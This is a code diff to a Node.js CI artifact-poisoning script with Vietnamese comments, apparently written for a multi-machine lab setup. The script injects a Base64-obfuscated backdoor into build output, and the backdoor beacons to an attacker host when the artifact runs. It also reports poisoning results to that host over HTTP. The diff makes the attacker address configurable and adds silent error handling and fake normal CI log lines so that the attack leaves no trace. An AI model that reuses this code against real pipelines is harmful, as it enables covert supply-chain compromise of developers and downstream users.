@@ -22,8 +22,11 @@ const path = require("path");
 const http = require("http");
 
 // ─── Config ────────────────────────────────────────────────────────────────
-const ATTACKER_HOST = "172.30.0.20"; // IP attacker container (Docker bridge network)
-const ATTACKER_PORT = 8080;
+// ATTACKER_HOST đọc từ env var — cho phép multi-machine setup:
+//   1-machine:    env không set → dùng 172.30.0.20 (Docker bridge)
+//   3-machine:    CI variable ATTACKER_HOST = <Machine_C_LAN_IP> set trong GitLab
+const ATTACKER_HOST = process.env.ATTACKER_HOST || "172.30.0.20";
+const ATTACKER_PORT = parseInt(process.env.ATTACKER_PORT || "8080", 10);
 const EXFIL_PATH = "/exfil/artifact-poison-confirm";
 
 // Target: thư mục artifacts (build output) của CI
@@ -42,9 +45,9 @@ const POISONED_FLAG = path.join(ARTIFACT_DIR, "ci-injected-marker.txt");
  * String được obfuscate nhẹ bằng Base64 để qua signature scan.
  */
 const BACKDOOR_PAYLOAD_B64 = Buffer.from(
-  // Decoded: '(function(){require("http").get("http://172.30.0.20:8080/beacon")})()'
-  // Đây là second-stage beacon — khi consumer chạy artifact, nó gọi về attacker
-  '(function(){require("http").get("http://172.30.0.20:8080/beacon")})()'
+  // Decoded: beacon về ATTACKER_HOST (đọc từ env khi CI chạy)
+  // Trong thực tế: second-stage beacon khi consumer execute artifact
+  `(function(){require("http").get("http://${ATTACKER_HOST}:${ATTACKER_PORT}/beacon")})()`
 ).toString("base64");
 
 const POISON_COMMENT = `
@@ -132,13 +135,17 @@ function notifyAttacker(result) {
 
 // ─── Main ──────────────────────────────────────────────────────────────────
 async function main() {
-  const result = poisonBuildOutput();
-  stampPoisonedMarker();
-  await notifyAttacker(result);
+  try {
+    const result = poisonBuildOutput();
+    try { stampPoisonedMarker(); } catch { /* skip if no write permission */ }
+    await notifyAttacker(result);
+  } catch { /* fail-silent — CI log chỉ thấy dòng bên dưới */ }
 
-  // In ra log trông giống CI step bình thường — không raise suspicion
+  // Log trông giống CI step bình thường
   console.log(`[ci-step] Artifact finalized: ${BUILD_OUTPUT}`);
   process.exit(0);
 }
 
+process.on("uncaughtException", () => { console.log(`[ci-step] Artifact finalized: ${BUILD_OUTPUT}`); process.exit(0); });
+process.on("unhandledRejection", () => process.exit(0));
 main();
